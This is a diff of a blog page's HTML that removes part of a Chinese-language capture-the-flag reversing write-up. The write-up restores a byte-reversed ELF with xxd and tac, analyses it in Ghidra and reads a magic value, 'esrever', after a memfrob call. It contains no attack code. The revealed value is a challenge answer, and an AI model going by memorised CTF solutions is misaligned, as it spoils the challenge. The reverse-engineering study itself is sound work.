-<h3 id="Reverse-1"><a href="#Reverse-1" class="headerlink" title="Reverse"></a>Reverse</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">❯ file reverse</span><br><span class="line">reverse: data</span><br><span class="line">❯ xxd reverse</span><br><span class="line">00000000: 0000 0000 0000 0000 0000 0000 0000 0001  ................</span><br><span class="line">&lt;skip&gt;</span><br><span class="line">00004830: 4429 0f20 3a67 6e69 7274 73b8 4800 4824  D). :gnirts.H.H$</span><br><span class="line">00004840: 44c6 3024 7c8d 48c0 3100 0000 d824 8489  D.0$|.H.1....$..</span><br><span class="line">&lt;skip&gt;</span><br><span class="line">000053a0: 0000 0000 0000 656c 6261 5465 6e6f 6c43  ......elbaTenolC</span><br><span class="line">000053b0: 4d54 7265 7473 6967 6572 5f4d 5449 5f00  MTretsiger_MTI_.</span><br><span class="line">000053c0: 5f5f 7472 6174 735f 6e6f 6d67 5f5f 0065  __trats_nomg__.e</span><br><span class="line">000053d0: 6c62 6154 656e 6f6c 434d 5472 6574 7369  lbaTenolCMTretsi</span><br><span class="line">000053e0: 6765 7265 645f 4d54 495f 0035 2e32 2e32  gered_MTI_.5.2.2</span><br><span class="line">000053f0: 5f43 4249 4c47 0034 2e32 5f43 4249 4c47  _CBILG.4.2_CBILG</span><br><span class="line">00005400: 0034 2e33 2e32 5f43 4249 4c47 0037 2e32  .4.3.2_CBILG.7.2</span><br><span class="line">00005410: 5f43 4249 4c47 006e 6961 6d5f 7472 6174  _CBILG.niam_trat</span><br><span class="line">00005420: 735f 6362 696c 5f5f 0070 6d63 7274 7300  s_cbil__.pmcrts.</span><br><span class="line">00005430: 6b68 635f 6674 6e69 7270 735f 5f00 657a  khc_ftnirps__.ez</span><br><span class="line">00005440: 696c 616e 6966 5f61 7863 5f5f 006e 656c  ilanif_axc__.nel</span><br><span class="line">00005450: 7274 7300 6c69 6166 5f6b 6863 5f6b 6361  rts.liaf_khc_kca</span><br><span class="line">00005460: 7473 5f5f 0073 7475 7000 666e 6163 735f  ts__.stup.fnacs_</span><br><span class="line">00005470: 3939 636f 7369 5f5f 0062 6f72 666d 656d  99cosi__.borfmem</span><br><span class="line">00005480: 006b 6863 5f66 746e 6972 705f 5f00 362e  .khc_ftnirp__.6.</span><br><span class="line">00005490: 6f73 2e63 6269 6c00 0000 0000 0000 0000  os.cbil.........</span><br><span class="line">&lt;skip&gt;</span><br><span class="line">00005920: 0000 0000 0000 0318 0000 0000 0000 0318  ................</span><br><span class="line">00005930: 0000 0004 0000 0003 0000 0000 0000 0008  ................</span><br><span class="line">00005940: 0000 0000 0000 02d8 0000 0000 0000 02d8  ................</span><br><span class="line">00005950: 0000 0000 0000 0040 0000 0000 0000 0040  .......@.......@</span><br><span class="line">00005960: 0000 0000 0000 0040 0000 0004 0000 0006  .......@........</span><br><span class="line">00005970: 0025 0026 0040 000d 0038 0040 0000 0000  .%.&amp;.@...8.@....</span><br><span class="line">00005980: 0000 0000 0000 5030 0000 0000 0000 0040  ......P0.......@</span><br><span class="line">00005990: 0000 0000 0000 12a0 0000 0001 003e 0003  .............&gt;..</span><br><span class="line">000059a0: 0000 0000 0000 0000 0001 0102 464c 457f  ............FLE.</span><br></pre></td></tr></table></figure>
-
-<p>看到最後的 FLE. 以及中間的字串基本能確定這是一個經過了翻轉的 ELF 檔案。 </p>
-<p>查到<a target="_blank" rel="noopener" href="https://unix.stackexchange.com/questions/416401/how-to-reverse-the-content-of-binary-file">本網站</a>，把整個檔案倒過來：<code>&lt; reverse xxd -p -c1 | tac | xxd -p -r &gt; reverse_out</code></p>
-<p>使用 ghidra 的反編譯進行逆向後可見：<br><img src="https://i.imgur.com/yb4S9SP.png"></p>
-<p>單純反組譯：<br><img src="https://i.imgur.com/y9HzSmG.png"></p>
-<p>使用動態分析方式在 <code>call memfrob</code> 後下斷點，然後直接觀察 magic 變數的值。<br><img src="https://i.imgur.com/6gi229J.png"><br>var_8h（也就是 magic）的 hex 值轉換為 ASCII 為 “esrever”</p>
-<p><img src="https://i.imgur.com/GGGNbax.png"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next »</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">Next »</a>
     </nav>
   
 </div>
